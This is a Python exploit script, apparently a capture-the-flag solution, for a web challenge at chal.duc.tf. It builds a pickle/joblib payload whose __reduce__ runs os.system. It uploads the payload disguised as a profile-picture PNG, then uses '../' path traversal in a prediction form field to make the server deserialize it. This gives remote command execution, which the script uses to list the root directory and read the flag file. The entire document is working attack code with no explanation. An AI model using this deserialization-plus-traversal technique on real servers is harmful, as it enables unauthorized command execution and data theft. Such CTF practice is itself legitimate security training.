import io
import os
import json
import joblib
import requests
import base64 as b64

REMOTE = 'https://chal.duc.tf:30104'
sess = requests.Session()

def make_payload(payload):
    class Model:
        def __reduce__(self):
            return (os.system, (payload,))
    return Model()

# 1. Login
resp = sess.post(f'{REMOTE}/login', data={
    'username': 'todo'
})
assert resp.ok

# 2. Get my cookie
token = json.loads(
    b64.b64decode(
        sess.cookies['session'].split('.')[0]
    ).decode()
)
uid = token['id']

# 3. Get the remote tmp location
resp = sess.get(f'{REMOTE}/profile-picture/{uid}')
assert resp.status_code == 404

remote_path = resp.text.split(' ')[-1].replace(f'{uid}.png', '').rstrip('/')

def exec_cmd(cmd):
    global sess
    global remote_path
    global uid

    tmpfile = io.BytesIO()
    joblib.dump(make_payload(f'{cmd} > {remote_path}/{uid}.png'), tmpfile)
    tmpfile.seek(0)

    resp = sess.post(f'{REMOTE}/profile-picture', files={
        'img': ('tmp.png', tmpfile)
    })
    assert resp.ok

    resp = sess.post(f'{REMOTE}/predict', data={
        'stock': '../'*16 + f'{remote_path}/{uid}.png',
        'prices': '1,2'
    })

    resp = sess.get(f'{REMOTE}/profile-picture/{uid}')
    return resp.text

files = exec_cmd('ls /').split('\n')
flagname = None
for filename in files:
    if filename.startswith('flag'):
        flagname = filename
        break

print(exec_cmd(f'cat /{flagname}'))
